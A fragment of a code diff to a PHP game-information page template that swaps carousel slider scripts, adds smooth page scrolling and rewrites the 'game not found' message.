-			<?php	if ($loggedin == 1) {  ?>
-			<p style="text-align: center; padding-top: 10px;"><span style="background-color: #333; border: 1px solid #DDD; border-radius: 6px; padding: 10px;"><a href="#bannerUpload" rel="facebox"><img src="images/common/icons/upload_24.png" style="border: 0px; vertical-align: -7px;" alt="Upload Artwork" /></a> <a href="#bannerUpload" rel="facebox" style="font-size: 16px;">Upload Banner</a></span></p>
-			<?php  }  ?>
-		</div>
-		<!-- End Banner Panel -->
-</div>
-<div style="clear: both;"></div>
+<!-- Start Fanart nivoSlider -->
+<script type="text/javascript">
+    $(window).load(function() {
+        $('#fanartSlider').nivoSlider({animSpeed: 220, effect: 'fade'});
+        $('#screenSlider').nivoSlider({animSpeed: 220, effect: 'fade'});
+        $('#bannerSlider').nivoSlider({animSpeed: 220, effect: 'fade'});
+    });
+</script>
+<!-- End Fanart nivoSlider -->
 
-                                                            <script type="text/javascript">
-                                                                DisplayImporterRow('<?=$game->
-        autoimport?>');
-                                                            </script>
-		
-		<script>
-			// $(document).ready(function(){	
-				// $("#frontBoxartSlide").easySlider({
-					// auto: true,
-					// continuous: true,
-					// nextId: "slider1next",
-					// prevId: "slider1prev"
-				// });
-			// });
-		
-			$(function () {
-				$('.boxartSlide').anythingSlider({
-				width : 300,						// Override the default CSS width
-				//height: 615,
-				delay: 3500,
-				buildNavigation: true,
-				buildArrows: false,
-				resizeContents: false,
-				easing: 'easeInOutExpo'
-				});
-				$('.fanartSlide').anythingSlider({
-				width : 300,						// Override the default CSS width
-				//height: 430,
-				delay: 3500,
-				buildNavigation: true,
-				buildArrows: false,
-				resizeContents: false,
-				easing: 'easeInOutExpo'
-				});
-				$('.screenshotsSlide').anythingSlider({
-				width : 300,						// Override the default CSS width
-				//height: 430,
-				delay: 3500,
-				buildNavigation: true,
-				buildArrows: false,
-				resizeContents: false,
-				easing: 'easeInOutExpo'
-				});
-				$('.bannerSlide').anythingSlider({
-				width : 300,						// Override the default CSS width
-				//height: 245,
-				delay: 3500,
-				buildNavigation: true,
-				buildArrows: false,
-				resizeContents: false,
-				easing: 'easeInOutExpo'
-				});
-			});
-		</script>
+<!-- Start jQuery Smooth Vertical Page Scrolling -->
+<script type="text/javascript">
+    $(document).ready(function() {  function filterPath(string) {  return string    .replace(/^\//,'')    .replace(/(index|default).[a-zA-Z]{3,4}$/,'')    .replace(/\/$/,'');  }  var locationPath = filterPath(location.pathname);  var scrollElem = scrollableElement('html', 'body');  $('a[href*=#]').each(function() {    var thisPath = filterPath(this.pathname) || locationPath;    if (  locationPath == thisPath    && (location.hostname == this.hostname || !this.hostname)    && this.hash.replace(/#/,'') ) {      var $target = $(this.hash), target = this.hash;      if (target) {        var targetOffset = $target.offset().top;        $(this).click(function(event) {          event.preventDefault();          $(scrollElem).animate({scrollTop: targetOffset}, 400, function() {            location.hash = target;          });        });      }    }  }); 
+	// use the first element that is "scrollable"
+	function scrollableElement(els) {    for (var i = 0, argLength = arguments.length; i <argLength; i++) {      var el = arguments[i],          $scrollElement = $(el);      if ($scrollElement.scrollTop()> 0) {        return el;      } else {        $scrollElement.scrollTop(1);        var isScrollable = $scrollElement.scrollTop()> 0;        $scrollElement.scrollTop(0);        if (isScrollable) {          return el;        }      }    }    return [];  }});
+</script>
+<!-- End jQuery Smooth Vertical Page Scrolling -->
+
 <?php
 	}
 	else
 	{
 ?>
-		<p>&nbsp;</p>
-		<h1 class="arcade" style="text-align: center;">Game Information</h1>
-		<p>&nbsp;</p>
-		<p style="text-align: center;">Sorry, there is no game that exists for game id #<?=$id?>.</p>
-		<p>&nbsp;</p>
+		<h1>Oops!</h1>
+		<h2 style="text-align: center;">We can't find the game you requested...</h2>
+		<p style="text-align: center;">If you believe you have recieved this message in error, please let us know.</p>
+		<p style="text-align: center;"><a href="<?= $baseurl; ?>/" style="color: orange;">Click here to return to the homepage</a></p>
+	</div>
+</div>
 <?php
 	}
 ?>
